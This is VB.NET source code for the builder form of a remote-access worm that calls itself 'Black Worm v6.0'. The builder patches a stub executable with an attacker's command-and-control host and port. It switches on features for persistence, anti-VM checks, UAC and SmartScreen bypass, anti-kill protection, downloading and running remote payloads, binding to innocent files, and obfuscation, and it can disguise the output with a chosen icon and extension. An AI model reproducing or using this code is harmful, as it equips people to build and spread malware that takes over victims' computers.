﻿Imports System.ComponentModel
Imports System.IO
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Security.Cryptography
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Text

Public Class Form2
    Dim dialog As New SaveFileDialog
    Dim c As New OpenFileDialog
    Public trd As System.Threading.Thread
    Public st As Integer = 0
    Dim stubpath As String
    Public IconName As String
    Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click

        If Not File.Exists((Application.StartupPath & "\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        ElseIf (host.Text = "") Then
            Interaction.MsgBox("Please Enter Your DNS Host or IP Address.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[host]") Then
                                            If crypt.Checked = True Then
                                                current.Operand = EncryptData(Form1.DEB(TextBox4.Text), host.Text)
                                            Else
                                                current.Operand = Form1.ENB(host.Text)
                                            End If
                                        Else
                                            If (str = "[port]") Then
                                                If crypt.Checked = True Then
                                                    current.Operand = EncryptData(Form1.DEB(TextBox4.Text), port.Text)
                                                Else
                                                    current.Operand = Form1.ENB(port.Text)
                                                End If
                                            End If

                                            If (str = "[vn]") Then
                                                current.Operand = vn.Text
                                            End If


                                            If (str = "[dwp]") Then
                                                current.Operand = Form1.ENB("6060")
                                            End If
                                            If (str = "[link]") Then
                                                current.Operand = link.Checked.ToString
                                            End If
                                            If (str = "[startname]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\" & "Stub.exe"))
                                            End If

                                            If (str = "[SchTask]") Then
                                                current.Operand = CheckBox5.Checked.ToString
                                            End If

                                            If (str = "[exen]") Then
                                                current.Operand = exename.Text
                                            End If

                                            If (str = "[UAC]") Then
                                                current.Operand = uac.Checked.ToString
                                            End If



                                            If (str = "[AntiVM]") Then
                                                current.Operand = CheckBox9.Checked.ToString
                                            End If

                                            If (str = "[BypassScreening]") Then
                                                current.Operand = BypassSP.Checked.ToString
                                            End If
                                            If (str = "[ShorCut]") Then
                                                current.Operand = shortcut.Checked.ToString
                                            End If

                                            If (str = "[Path]") Then
                                                current.Operand = PathS.Text
                                            End If

                                            If (str = "[MUTEX]") Then
                                                current.Operand = Form1.ENB(TextBox2.Text)
                                            End If
                                            If (str = "[Encrypt]") Then
                                                current.Operand = crypt.Checked.ToString
                                            End If

                                            If (str = "[Password]") Then
                                                current.Operand = Form1.ENB(My.Settings.Password)
                                            End If


                                            If CheckBox1.Checked = True Then
                                                If (str = "[DownloaderStatus]") Then
                                                    current.Operand = "True"
                                                End If

                                                If (str = "[DownloadURL]") Then
                                                    current.Operand = Form1.ENB(TextBox6.Text)
                                                End If
                                                If (str = "[DownloadPath]") Then
                                                    current.Operand = ComboBox2.SelectedItem
                                                End If
                                                If (str = "[DownloadName]") Then
                                                    current.Operand = TextBox7.Text
                                                End If
                                                If (str = "[Password]") Then
                                                    current.Operand = PortSettings.TextBox3.Text
                                                End If
                                                If (str = "[DownloadSleep]") Then
                                                    current.Operand = NumericUpDown1.Value.ToString
                                                End If
                                            Else
                                                If (str = "[DownloaderStatus]") Then
                                                    current.Operand = "False"
                                                End If

                                                If (str = "[DownloadURL]") Then
                                                    current.Operand = ""
                                                End If
                                                If (str = "[DownloadPath]") Then
                                                    current.Operand = ""
                                                End If
                                                If (str = "[DownloadName]") Then
                                                    current.Operand = ""
                                                End If
                                                If (str = "[DownloadSleep]") Then
                                                    current.Operand = ""
                                                End If
                                            End If


                                            If CheckBox3.Checked = True Then
                                                If (str = "[BinderStatus]") Then
                                                    current.Operand = "True"
                                                End If

                                                If (str = "[BinderByte]") Then
                                                    current.Operand = Form1.ENB(TextBox9.Text)
                                                End If
                                                If (str = "[BinderPath]") Then
                                                    current.Operand = ComboBox3.SelectedItem
                                                End If
                                                If (str = "[BinderName]") Then
                                                    current.Operand = TextBox10.Text
                                                End If

                                                If (str = "[BinderSleep]") Then
                                                    current.Operand = NumericUpDown2.Value.ToString
                                                End If
                                            Else
                                                If (str = "[BinderStatus]") Then
                                                    current.Operand = "False"
                                                End If

                                                If (str = "[BinderByte]") Then
                                                    current.Operand = ""
                                                End If
                                                If (str = "[BinderPath]") Then
                                                    current.Operand = ""
                                                End If
                                                If (str = "[BinderName]") Then
                                                    current.Operand = ""
                                                End If

                                                If (str = "[BinderSleep]") Then
                                                    current.Operand = ""
                                                End If
                                            End If

                                            If CheckBox6.Checked = True Then
                                                If (str = "[WatcherStatus]") Then
                                                    current.Operand = "True"
                                                End If

                                                If (str = "[WatcherByte]") Then
                                                    current.Operand = Convert.ToBase64String(IO.File.ReadAllBytes("addons\WDService.exe"))
                                                End If
                                            Else
                                                If (str = "[WatcherStatus]") Then
                                                    current.Operand = "False"
                                                End If

                                                If (str = "[WatcherByte]") Then
                                                    current.Operand = ""
                                                End If
                                            End If

                                            If (str = "[antikill]") Then
                                                current.Operand = kill.Checked.ToString
                                            End If
                                            If (str = "[EncryptKey]") Then
                                                current.Operand = TextBox13.Text
                                            End If
                                            If (str = "[DropBox]") Then
                                                current.Operand = CheckBox2.Checked.ToString
                                            End If

                                            If (str = "[HardInstall]") Then
                                                current.Operand = CheckBox7.Checked.ToString
                                            End If

                                            If (str = "[InstallName]") Then
                                                current.Operand = TextBox11.Text
                                            End If
                                            If (str = "[startupstatus]") Then
                                                current.Operand = CheckBox4.Checked.ToString
                                            End If
                                            If (str = "[Critical]") Then
                                                current.Operand = CheckBox8.Checked.ToString
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                If ComboBox1.Text = "Select Extension" Then
                    .InitialDirectory = Application.StartupPath
                    .FileName = "WorM" & ".exe"
                    .Filter = "Executable Applications " & "(*.exe)" & "|*" & ".exe"
                    .Title = "Choose a place to save your server | Black Worm v6.0 [ Black Ninja ]"
                Else
                    Dim FileExtention() As String = ComboBox1.SelectedItem.ToString.Split(" - ")
                    .InitialDirectory = Application.StartupPath
                    .FileName = "WorM" & FileExtention(0)
                    .Filter = "Executable Applications " & "(" & FileExtention(0) & ")" & "|*" & FileExtention(0)
                    .Title = "Choose a place to save your server | Black Worm v6.0 [ Black Ninja ]"
                End If
            End With

            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                MsgBox("Your Worm Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
            If CheckBox10.Checked = True Then
                Shell("Packer\Confuser.exe " & """" & dialog.FileName & """" & " -o Output")
            End If

            If RadioButton1.Checked = True Then
                IconChanger.InjectIcon(dialog.FileName, "icons\" & IconName & ".ico")
            End If

            If RadioButton3.Checked = True Then
                Dim abc As New FileInfo(c.FileName)
                IconChanger.InjectIcon(dialog.FileName, "icons\" & abc.Name)
            End If
        End If
        Me.Close()
    End Sub
    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        AddIcons()
        port.Text = Form1.k
    End Sub
    Public Sub AddIcons()
        Dim files() As String = IO.Directory.GetFiles("icons")
        Dim i As Integer = 0
        For Each file As String In files
            If file.EndsWith(".ico") Then
                ImageList1.Images.Add(Image.FromFile(file))
                ListView1.Items.Add(file.Split("\")(1).Split(".")(0), i)
                i = i + 1
            End If
        Next
    End Sub
    Public Function Randomisi(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function Randomisi2(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Function RandomNO(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "1234567890"
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Private Sub TextBox2_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles TextBox2.MouseMove
        TextBox2.Text = "bWorm[xxxxxx-12345]".Replace("xxxxxx", Randomisi(6)).Replace("12345", RandomNO(5))
    End Sub

    Public Function EncryptData(ByVal publicKeyPath As String, ByVal data2Encrypt As String) As String
        Dim cipherbytes As Byte()
        Using rsa As RSACryptoServiceProvider = New RSACryptoServiceProvider(4096)
            rsa.PersistKeyInCsp = False
            rsa.FromXmlString(publicKeyPath)
            Dim plainbytes As Byte() = Encoding.UTF8.GetBytes(data2Encrypt)
            cipherbytes = rsa.Encrypt(plainbytes, False)
        End Using
        Return Convert.ToBase64String(cipherbytes)
    End Function

    Private Sub crypt_CheckedChanged(sender As Object, e As EventArgs) Handles crypt.CheckedChanged
        If crypt.Checked = True Then
            Button2.Enabled = True
            TextBox4.Enabled = True
        Else
            Button2.Enabled = False
            TextBox4.Enabled = False
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim tr As New Threading.Thread(AddressOf CreateNewKeys)
        TextBox4.Text = "Please Wait..."
        tr.Start()
    End Sub
    Private Sub CreateNewKeys()
        Dim Keys As KeyGen = KeyGen.CreateNewKeys
        TextBox4.Text = Form1.ENB(Keys.Publickey)
        TextBox13.Text = Form1.ENB(Keys.Privatekey)
    End Sub
    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged
        For Each x As ListViewItem In ListView1.SelectedItems
            IconName = x.Text
        Next
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        With c
            .Title = "Choose png icon | Black Worm"
            .Filter = "Icon File (*.ico)|*.ico"
            If c.ShowDialog = Windows.Forms.DialogResult.OK Then

                Dim cd As New FileInfo(c.FileName)
                TextBox3.Text = cd.Name
            End If
        End With
    End Sub

    Private Sub RadioButton1_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton1.CheckedChanged
        If RadioButton1.Checked = True Then
            ListView1.Enabled = True
            TextBox3.Enabled = False
            Button3.Enabled = False
        End If
    End Sub

    Private Sub RadioButton2_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton2.CheckedChanged
        If RadioButton2.Checked = True Then
            ListView1.Enabled = False
            Button3.Enabled = False
            TextBox3.Enabled = False
        End If
    End Sub

    Private Sub RadioButton3_CheckedChanged(sender As Object, e As EventArgs) Handles RadioButton3.CheckedChanged
        If RadioButton3.Checked = True Then
            ListView1.Enabled = False
            Button3.Enabled = True
            TextBox3.Enabled = True
        Else
            Button3.Enabled = False
            TextBox3.Enabled = False
        End If
    End Sub

    Private Sub CheckBox1_CheckedChanged_1(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            TextBox8.Text = Randomisi(20)
            GroupBox1.Enabled = True
        Else
            TextBox8.Text = ""
            GroupBox1.Enabled = False
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        Dim a As New OpenFileDialog
        With a
            .Title = "Select a File to Bind"
            .Filter = "Any File (*.*)|*.*"
            If a.ShowDialog = Windows.Forms.DialogResult.OK Then
                TextBox9.Text = a.FileName
                Dim FileInfo As New FileInfo(a.FileName)
                TextBox10.Text = FileInfo.Name
            End If
        End With
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            GroupBox2.Enabled = True
        Else
            GroupBox2.Enabled = False
        End If
    End Sub
    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        exename.Text = "name.exe".Replace("name", Randomisi2(6))
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        TextBox11.Text = "name.exe".Replace("name", Randomisi2(7))
    End Sub
End Class
